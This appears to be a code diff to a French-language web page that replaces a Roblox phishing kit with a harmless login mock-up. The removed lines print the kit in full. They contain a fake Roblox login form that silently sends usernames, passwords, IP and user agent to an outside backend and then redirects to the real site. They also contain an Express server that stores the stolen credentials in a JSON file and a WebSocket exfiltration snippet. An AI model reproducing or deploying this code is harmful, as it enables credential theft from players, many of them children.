@@ -1,129 +1,329 @@
-# RobIox
-# Join me>
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roblox - Jeux et Aventure</title>
-    <link rel="stylesheet" href="https://www.roblox.com/static/css/roblox.css?v=20240510">
-    <style>
-        /* Override des styles pour masquer les erreurs */
-        body { background: #f0f0f0; }
-        .login-container { width: 350px; margin: 100px auto; }
-        .login-input { width: 100%; padding: 10px; margin: 10px 0; }
-        .login-button { width: 100%; padding: 10px; background: #38a1ff; color: white; border: none; }
-        .fake-error { display: none; } /* Cache les messages d'erreur */
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Maquette de connexion</title>
+
+<style>
+* {
+  box-sizing: border-box;
+}
+
+body {
+  margin: 0;
+  color: white;
+  font-family: Arial, sans-serif;
+  background-color: #111216;
+  background-image:
+    linear-gradient(rgba(0,0,0,.45), rgba(0,0,0,.58)),
+    url("arriere-plan.jpg");
+  background-size: cover;
+  background-position: center top;
+  background-repeat: no-repeat;
+  background-attachment: fixed;
+}
+
+header {
+  background: #191a20;
+  padding: 20px;
+}
+
+nav {
+  display: flex;
+  justify-content: flex-end;
+  align-items: center;
+  gap: 16px;
+  flex-wrap: wrap;
+}
+
+nav a, .menu a {
+  color: white;
+  text-decoration: none;
+}
+
+nav a {
+  font-size: 17px;
+}
+
+.primary {
+  background: #345cf4;
+  padding: 14px 20px;
+  border-radius: 13px;
+}
+
+.menu {
+  display: flex;
+  justify-content: space-around;
+  gap: 12px;
+  width: 100%;
+  padding-top: 22px;
+}
+
+main {
+  padding: 40px 18px;
+}
+
+.login {
+  max-width: 620px;
+  margin: auto;
+  background: #25262e;
+  padding: 30px 24px 55px;
+  border-radius: 8px;
+}
+
+h1 {
+  text-align: center;
+  font-size: 32px;
+  margin: 4px 0 40px;
+}
+
+input {
+  display: block;
+  width: 100%;
+  height: 75px;
+  margin-bottom: 30px;
+  border-radius: 22px;
+  background: #343640;
+  border: 1px solid #484a56;
+  padding: 20px 35px;
+  font-size: 20px;
+  color: white;
+}
+
+button {
+  cursor: pointer;
+}
+
+.login-btn {
+  width: 100%;
+  min-height: 65px;
+  border-radius: 15px;
+  font-size: 19px;
+  background: transparent;
+  color: white;
+  border: 1px solid white;
+}
+
+.forgot {
+  text-align: center;
+  margin: 75px 0;
+  font-size: 20px;
+}
+
+.login a {
+  color: inherit;
+}
+
+hr {
+  border: 0;
+  border-top: 1px solid #41424b;
+  margin-bottom: 55px;
+}
+
+.secondary {
+  width: 100%;
+  min-height: 65px;
+  border-radius: 15px;
+  font-size: 19px;
+  background: #3a3b46;
+  color: white;
+  border: none;
+  margin-bottom: 20px;
+}
+
+.signup {
+  text-align: center;
+  margin-top: 65px;
+  font-size: 19px;
+  line-height: 1.5;
+}
+
+.notice {
+  max-width: 620px;
+  margin: 14px auto 0;
+  padding: 12px;
+  color: #ddd;
+  text-align: center;
+  font-size: 14px;
+  line-height: 1.5;
+}
+
+footer {
+  background: #0b0c0f;
+  padding: 55px 30px 25px;
+}
+
+.footer-links {
+  display: flex;
+  flex-wrap: wrap;
+  justify-content: space-between;
+  gap: 30px;
+}
+
+.footer-links a {
+  color: #ddd;
+  text-decoration: none;
+  font-size: 18px;
+}
+
+.footer-bottom {
+  border-top: 1px solid #444;
+  margin-top: 100px;
+  padding-top: 30px;
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  flex-wrap: wrap;
+  gap: 20px;
+  color: #ccc;
+  font-size: 13px;
+}
+
+.language {
+  width: auto;
+  padding: 15px 25px;
+  background: transparent;
+  border: 1px solid #777;
+  border-radius: 12px;
+  color: white;
+  font-size: 16px;
+}
+
+.floating-help {
+  position: fixed;
+  right: 18px;
+  bottom: 18px;
+  width: 65px;
+  height: 65px;
+  border-radius: 50%;
+  background: #345cf4;
+  color: white;
+  border: none;
+  font-size: 30px;
+  z-index: 10;
+}
+
+@media(max-width: 480px) {
+  .login {
+    padding: 25px 18px 45px;
+  }
+
+  .menu {
+    font-size: 14px;
+  }
+
+  .footer-links {
+    gap: 25px;
+  }
+
+  .footer-bottom {
+    margin-top: 65px;
+  }
+}
+</style>
 </head>
+
 <body>
-    <div class="login-container">
-        <h1>Roblox</h1>
-        <form id="loginForm">
-            <input type="text" class="login-input" placeholder="Nom d'utilisateur" id="username" required>
-            <input type="password" class="login-input" placeholder="Mot de passe" id="password" required>
-            <button type="submit" class="login-button">Se connecter</button>
-            <div id="fakeError" class="fake-error">Erreur de connexion. Vérifiez vos identifiants.</div>
-        </form>
-    </div>
 
-    <!-- Script de capture des infos (invisible pour l'utilisateur) -->
-    <script>
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
-            e.preventDefault();
+<header>
+  <nav>
+    <a class="primary" href="#creer">Créer un compte</a>
+    <a href="#connexion">Connexion</a>
+    <a href="#recherche">⌕</a>
+  </nav>
 
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
-            const userAgent = navigator.userAgent;
-            const ip = getIP(); // On récupère l'IP via un service externe
+  <div class="menu">
+    <a href="#decouvrir">Découvrir</a>
+    <a href="#catalogue">Catalogue</a>
+    <a href="#creer">Créer</a>
+    <a href="#credits">Crédits</a>
+  </div>
+</header>
 
-            // Envoi des données vers ton backend (GitHub Pages ne supporte pas les backends, donc tu dois utiliser un service comme Heroku ou un VPS)
-            fetch('https://ton-backend-roblox.vercel.app/api/login', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    username,
-                    password,
-                    ip,
-                    userAgent,
-                    timestamp: new Date().toISOString()
-                })
-            })
-            .then(response => {
-                if (response.ok) {
-                    // Redirige vers une page "Roblox" fake pour garder l'utilisateur
-                    window.location.href = "https://www.roblox.com/home";
-                } else {
-                    document.getElementById('fakeError').style.display = 'block';
-                }
-            })
-            .catch(() => {
-                document.getElementById('fakeError').style.display = 'block';
-            });
-        });
+<main>
+  <section class="login" id="connexion">
 
-        // Fonction pour récupérer l'IP (via un service gratuit)
-        function getIP() {
-            return fetch('https://api.ipify.org?format=json')
-                .then(res => res.json())
-                .then(data => data.ip)
-                .catch(() => "IP non disponible");
-        }
-    </script>
-</body>
-</html>
-const express = require('express');
-const bodyParser = require('body-parser');
-const fs = require('fs');
-const app = express();
+    <h1>Connexion</h1>
 
-app.use(bodyParser.json());
+    <form id="demoForm">
+      <input type="text"
+        placeholder="Identifiant / E-mail"
+        autocomplete="off">
 
-// Stockage des données (fichier JSON)
-const DATA_FILE = 'roblox_credentials.json';
+      <input type="password"
+        placeholder="Mot de passe"
+        autocomplete="off">
 
-// Endpoint pour recevoir les infos
-app.post('/api/login', (req, res) => {
-    const { username, password, ip, userAgent, timestamp } = req.body;
+      <button class="login-btn" type="submit">
+        Connexion
+      </button>
+    </form>
 
-    // Vérifie si le fichier existe, sinon crée-le
-    if (!fs.existsSync(DATA_FILE)) {
-        fs.writeFileSync(DATA_FILE, JSON.stringify([]));
-    }
+    <p class="forgot">
+      <a href="#aide">Mot de passe ou identifiant oublié ?</a>
+    </p>
 
-    // Lit les données existantes
-    const existingData = JSON.parse(fs.readFileSync(DATA_FILE));
-    existingData.push({ username, password, ip, userAgent, timestamp });
+    <hr>
 
-    // Sauvegarde les nouvelles données
-    fs.writeFileSync(DATA_FILE, JSON.stringify(existingData, null, 2));
+    <button class="secondary" type="button">
+      Recevoir un code par e-mail
+    </button>
 
-    res.status(200).send('Connexion enregistrée.');
-});
+    <button class="secondary" type="button">
+      Connexion rapide
+    </button>
 
-// Démarrage du serveur
-const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => {
-    console.log(`Serveur en écoute sur le port ${PORT}`);
-});
-new WebSocket('wss://ton-backend-roblox.vercel.app/socket');
+    <button class="secondary" type="button">
+      Autres options de connexion
+    </button>
 
-socket.onopen = () => {
-    socket.send(JSON.stringify({
-        action: "login_attempt",
-        data: {
-            username: document.getElementById('username').value,
-            password: document.getElementById('password').value
-        }
-    }));
-};
-<div id="fakeRoblox" style="display: none;">
-    <iframe src="https://www.roblox.com/home" width="100%" height="1000px"></iframe>
-</div>
+    <p class="signup">
+      Vous n'avez pas de compte ?
+      <a href="#creer">Créer un compte</a>
+    </p>
+
+  </section>
+
+  <p class="notice">
+    Maquette de démonstration non officielle.
+    Ne saisis pas de vrai mot de passe sur cette page.
+  </p>
+</main>
+
+<footer>
+
+  <div class="footer-links">
+    <a href="#apropos">À propos</a>
+    <a href="#emplois">Emplois</a>
+    <a href="#presse">Presse</a>
+    <a href="#parents">Parents</a>
+    <a href="#cadeaux">Cartes-cadeaux</a>
+    <a href="#aide">Aide</a>
+    <a href="#conditions">Conditions</a>
+    <a href="#accessibilite">Accessibilité</a>
+    <a href="#confidentialite">Confidentialité</a>
+    <a href="#preferences">Préférences de confidentialité</a>
+    <a href="#sitemap">Plan du site</a>
+    <a href="#cookies">Options des cookies</a>
+  </div>
+
+  <div class="footer-bottom">
+    <button class="language">Français　⌄</button>
+    <span>© 2026 Exemple — Maquette de démonstration</span>
+  </div>
+
+</footer>
+
+<button class="floating-help" aria-label="Aide">?</button>
 
 <script>
-    // Après envoi des données, affiche l'iframe
-    fetch('...').then(() => {
-        document.getElementById('fakeRoblox').style.display = 'block';
-    });
+document.getElementById("demoForm")
+.addEventListener("submit", function(event) {
+  event.preventDefault();
+  alert("Maquette de démonstration uniquement.");
+});
 </script>
+
+</body>
+</html>
